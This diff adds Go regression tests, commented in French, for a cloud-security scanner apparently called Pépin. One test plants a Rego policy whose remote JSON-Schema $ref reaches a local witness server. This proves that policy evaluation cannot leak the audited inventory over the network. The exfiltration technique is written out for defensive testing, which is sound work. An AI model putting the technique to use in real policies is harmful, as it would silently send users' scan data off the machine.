@@ -1,0 +1,121 @@
+package cmd
+
+import (
+	"encoding/json"
+	"net/http"
+	"net/http/httptest"
+	"os"
+	"path/filepath"
+	"sync/atomic"
+	"testing"
+)
+
+// Une règle chargée par `--policy-dir` est du CODE TIERS, exécuté sur un inventaire
+// qui contient tout ce que le scan a collecté. Elle ne doit jamais atteindre le
+// réseau — sans quoi Pépin devient le véhicule d'exfiltration de ce qu'il audite.
+//
+// Le moteur retire `http.send`, `net.lookup_ip_addr` et `opa.runtime` de son jeu de
+// capacités, ce qui a longtemps suffi à le dire. C'était faux : OPA résout le `$ref`
+// distant d'un JSON-Schema par HTTP AU MOMENT DE L'ÉVALUATION, sur un chemin qui ne
+// passe par aucun builtin. Mesuré contre scankit v0.2.2, que ce dépôt épinglait :
+// la requête partait, l'inventaire sortait, et `Evaluate` ne rendait AUCUNE erreur.
+// Le silence est la partie qui compte — rien, chez un consommateur, n'aurait paru
+// anormal.
+//
+// Cette garde ne lit pas le code, elle TEND UN TÉMOIN. C'est la seule façon de
+// prouver un refus réseau : une lecture de source ne prouve rien, un serveur qui
+// reste muet si. Elle vaut aussi contre une régression d'ÉPINGLAGE — une remontée
+// de version en arrière rendrait la brèche sans que rien d'autre ne rougisse.
+func TestNoThirdPartyPolicyCanReachTheNetwork(t *testing.T) {
+	var atteint atomic.Int32
+	temoin := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
+		atteint.Add(1)
+		w.Header().Set("Content-Type", "application/json")
+		_ = json.NewEncoder(w).Encode(map[string]any{"type": "object"})
+	}))
+	defer temoin.Close()
+
+	dir := t.TempDir()
+	// Le `$ref` distant : aucun builtin réseau n'est appelé, c'est le chargeur de
+	// schémas d'OPA qui sort. Interpoler l'inventaire dans le chemin est ce qui
+	// transformerait la fuite en exfiltration ciblée.
+	regle := `package pepin.rules
+
+import rego.v1
+
+deny contains f if {
+	json.match_schema(input, {"$ref": "` + temoin.URL + `/leak/EXFIL-TOKEN"})
+	f := {
+		"code": "compute_instance_has_security_group",
+		"severity": "low",
+		"subject": "x",
+		"message": "x",
+		"remediation": "x",
+		"labels": {
+			"provider": "scaleway",
+			"category": "security",
+			"confidence": "confirmed",
+			"message_en": "x",
+			"remediation_en": "x",
+		},
+	}
+}
+`
+	if err := os.WriteFile(filepath.Join(dir, "leak.rego"), []byte(regle), 0o600); err != nil {
+		t.Fatalf("écriture de la règle témoin : %v", err)
+	}
+
+	bin := buildPepin(t)
+	// Le scan peut échouer ou non : ce qui se mesure ici n'est pas son verdict, c'est
+	// si le témoin a été touché.
+	_, _ = runPepin(t, bin, nil, "scan", "scaleway", scanFixture, "--policy-dir", dir, "--format", "json")
+
+	if n := atteint.Load(); n != 0 {
+		t.Errorf("une règle tierce a atteint le réseau (%d requête(s) reçues).\n"+
+			"  L'inventaire audité est sorti de la machine, en silence : `Evaluate` ne\n"+
+			"  rend aucune erreur sur ce chemin. Vérifier l'épinglage de scankit —\n"+
+			"  le refus réseau du chargeur de schémas exige >= v0.2.3.", n)
+	}
+}
+
+// TestNoResultCarriesAnEmptyProof — l'issue #146.
+//
+// `evidence.proves` sortait en `["","",""]` sur CHAQUE résultat : `omitempty` sur un
+// tableau de taille fixe est sans effet, et l'a toujours été. Un lecteur ne pouvait
+// donc pas distinguer « aucune preuve enregistrée » de « trois preuves enregistrées,
+// toutes vides » — et les blancs voyageaient jusque dans les bundles scellés, où
+// personne ne peut plus les interpréter.
+//
+// Corrigé dans scankit v0.3.1, qui omet le champ quand rien n'y a été inscrit. Cette
+// garde vit ICI parce que c'est Pépin qui publie ces dossiers : une régression
+// d'épinglage remettrait les blancs sans que rien d'autre ne rougisse.
+func TestNoResultCarriesAnEmptyProof(t *testing.T) {
+	bin := buildPepin(t)
+	stdout, _ := runPepin(t, bin, nil, "scan", "scaleway", scanFixture, "--format", "assessment")
+
+	var doc struct {
+		Results []struct {
+			Control  string `json:"control"`
+			Evidence struct {
+				Proves []string `json:"proves"`
+			} `json:"evidence"`
+		} `json:"results"`
+	}
+	if err := json.Unmarshal([]byte(stdout), &doc); err != nil {
+		t.Fatalf("sortie assessment illisible : %v", err)
+	}
+	if len(doc.Results) == 0 {
+		t.Fatal("aucun résultat : la garde ne mesure rien")
+	}
+	for _, r := range doc.Results {
+		for i, p := range r.Evidence.Proves {
+			if p == "" {
+				t.Errorf("%s : evidence.proves[%d] est une chaîne vide.\n"+
+					"  Un dossier scellé porterait un blanc que personne ne peut interpréter :\n"+
+					"  « aucune preuve » et « une preuve vide » ne veulent pas dire la même chose.\n"+
+					"  Le champ doit être ABSENT quand rien n'y a été inscrit (scankit >= v0.3.1).",
+					r.Control, i)
+			}
+		}
+	}
+}
